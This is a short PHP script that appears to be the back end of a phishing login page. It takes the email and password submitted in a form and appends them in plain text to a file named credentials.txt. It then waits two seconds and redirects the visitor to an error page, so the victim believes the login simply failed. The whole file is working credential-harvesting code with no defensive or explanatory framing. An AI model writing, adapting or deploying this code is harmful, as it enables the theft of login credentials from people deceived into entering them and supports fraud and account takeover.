<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $file = fopen("credentials.txt","a");
    $text = "email:{$email}\npassword:{$password}\n---\n";
    fwrite($file,$text);
    fclose($file);

    sleep(2);
    header('Location: error.php');
    exit;
}
?>
